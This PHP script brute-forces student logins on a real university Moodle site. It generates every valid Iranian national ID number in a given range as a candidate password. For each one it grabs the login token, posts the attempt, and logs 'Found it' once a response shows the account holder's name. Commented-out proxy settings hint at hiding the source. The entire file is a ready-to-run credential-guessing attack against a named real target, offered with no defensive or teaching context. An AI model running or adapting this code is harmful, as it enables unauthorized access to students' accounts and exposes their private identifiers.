<?php

define('WORKING_DIRECTORY', getcwd());

$options = getopt("f:");
$from = $options["f"];
$options = getopt("u:");
$GLOBALS['usernumber'] = $options["u"];
$options = getopt("t:");
$to = $options["t"];
$GLOBALS['from'] = $from;

function error_log2($content,$filename=null){
    $date = date('m/d/Y h:i:s a', time());
    file_put_contents(($filename ?: 'progress') . '.txt', '['.$date.'] '.$content . "\n",FILE_APPEND);
}

function attackLms($username,$code){
    $ckfile = __DIR__ . "/cookie_".$GLOBALS['from'].".txt";
    $target_host = "http://lms.ikiu.ac.ir/login/index.php";

    $host = [implode(':', [ // $host stores information for domain names resolving (like /etc/hosts file)
        'lms.ikiu.ac.ir', // Host that will be stored in our "DNS-cache"
        80, // Default port for HTTPS, can be 80 for HTTP
        gethostbyname('lms.ikiu.ac.ir'), // IPv4-address where to point our domain name (Host)
    ])];
    // 2. Visit homepage to set cookie
    $ch = curl_init ($target_host);
    curl_setopt ($ch, CURLOPT_COOKIEJAR, $ckfile);
//    $proxy = '80.93.213.210:80';
//    curl_setopt($ch, CURLOPT_PROXY, $proxy);
    curl_setopt ($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt( $ch, CURLOPT_COOKIESESSION, true );
//    curl_setopt( $ch, CURLOPT_TCP_FASTOPEN, true );
    curl_setopt( $ch, CURLOPT_ENCODING, '' );
    curl_setopt($ch, CURLOPT_RESOLVE, $host);
    curl_setopt($ch, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4 );
    $output = curl_exec ($ch);
//    echo $output;
//exit(0);
    preg_match_all('/<input.*logintoken"\s*value="(.*)"/m', $output, $matches, PREG_SET_ORDER, 0);
    $token = $matches[0][1];
//$token = 'b0yPKjSbQFNzuqSOXD5SOFa6vQB04UZ7';
//
    $post_data = 'logintoken='.$token.'&username=ik'.$username.'&password='.$code;
//// 3. Continue
//$login = curl_init ($target_host);
    curl_setopt($ch, CURLOPT_COOKIESESSION, 1);
    curl_setopt($ch, CURLOPT_COOKIEJAR, $ckfile);
    curl_setopt($ch, CURLOPT_COOKIEFILE, $ckfile);
//    curl_setopt($ch, CURLOPT_PROXY, $proxy);
    curl_setopt($ch, CURLOPT_TIMEOUT, 40);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
//    curl_setopt($ch, CURLOPT_TCP_FASTOPEN, 1);
    curl_setopt($ch, CURLOPT_HEADER, 1);
    curl_setopt( $ch, CURLOPT_ENCODING, '' );
    curl_setopt($ch, CURLOPT_RESOLVE, $host);
    curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4 );
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data);
    $output =  curl_exec($ch);
    curl_close($ch);
    preg_match_all('/(class="accesshide">ورود نامعتبر، لطفاً دوباره سعی کنید)/m', $output, $matchesIfWrong, PREG_SET_ORDER, 0);
    if(count($matchesIfWrong) === 0){
        preg_match_all('/<span class="usertext mr-1">(.*?)<\/span>/m', $output, $matchesIfRight, PREG_SET_ORDER, 0);
        if(count($matchesIfRight) > 0){
            return $matchesIfRight[0][1];
        }
    }else{
        return 'fail';
    }
}
function getNewCode($lastCode){
//    $lastCode = ((int) $lastCode) + 1;
    if(strlen((string)$lastCode) > 9) return false;
    $lastCode = sprintf('%09d',$lastCode);
    return $lastCode;
}
function makeTheCode($newCode){
    $num10= $newCode[0];
    $num9= $newCode[1];
    $num8= $newCode[2];
    $num7= $newCode[3];
    $num6= $newCode[4];
    $num5= $newCode[5];
    $num4= $newCode[6];
    $num3= $newCode[7];
    $num2= $newCode[8];
    $sum=($num10*10)+($num9*9)+($num8*8)+($num7*7)+($num6*6)+($num5*5)+($num4*4)+($num3*3)+($num2*2);
    $remain=$sum%11;
    $Codemelli='';
    if ($remain<2) {
        $Codemelli=$num10.$num9.$num8.$num7.$num6.$num5.$num4.$num3.$num2.$remain;
    }
    if ($remain>=2) {
        $num1=11-$remain;
        $Codemelli=$num10.$num9.$num8.$num7.$num6.$num5.$num4.$num3.$num2.$num1;
    }
    return [
        'code'=>$Codemelli,
        'lastCode'=>$newCode
    ];
}
function checkIfIsValid($code){
    $arrInvalids = ['1111111111','0000000000','2222222222','3333333333','4444444444','5555555555','6666666666','7777777777','8888888888','9999999999'];
    if(in_array($code, $arrInvalids, true))return false;
    return true;
}



$GLOBALS['times'] = 0;
error_log2('started '.$GLOBALS['usernumber'].' : from : '.$from . ' ,to : ' .$to,$from);
//error_log2('started '.$GLOBALS['usernumber'].' : from : '.$from . ' ,to : ' .$to);
for($i = $from ;$i < $to; $i++){
    $cityCodeString =  (string)$i;

    $newCodeString = getNewCode(isset($_GET['code']) ? ($_GET['code']) : $cityCodeString);
//    if($GLOBALS['times'] % 100000 === 0){
//        echo $newCodeString .PHP_EOL;
//    }
    if($newCodeString === false) break;
    $result = makeTheCode($newCodeString);
    while(!checkIfIsValid($result['code'])){
        $result = makeTheCode($result['code']);
    }
    $code = $result['code'];
    $_GET['code'] = $result['lastCode']+1;


    $attackLms = attackLms($GLOBALS['usernumber'], $code);
//    $attackLms = false;
    if($attackLms !== 'fail' && $attackLms){
        echo PHP_EOL. 'Found it ' . $GLOBALS['usernumber'] . ' has ' . $code . PHP_EOL;
        error_log2('Found it ' . $GLOBALS['usernumber'] . ' has ' . $code . PHP_EOL,$from);
        error_log2('Found it ' . $GLOBALS['usernumber'] . ' has ' . $code . PHP_EOL);
        exit(0);
    }
    $GLOBALS['times']++;

        echo 'tested : '. $from . '   '. $newCodeString.PHP_EOL;

//    sleep(1);
//    echo $i;
    if($i % 1000 === 0){
        error_log2('going : from : '.$i . ' ,to : ' .$to,$from);
//        echo 'from : '. $from . '   '. $i.PHP_EOL;
    }
}
$fromString = sprintf('%09d',$from);

error_log2('finished : from : '.$fromString . ' ,to : ' .$to,$fromString);
//error_log2('finished : from : '.$fromString . ' ,to : ' .$to);
//echo 'from : '. $fromString . '   '. $newCodeString.PHP_EOL;
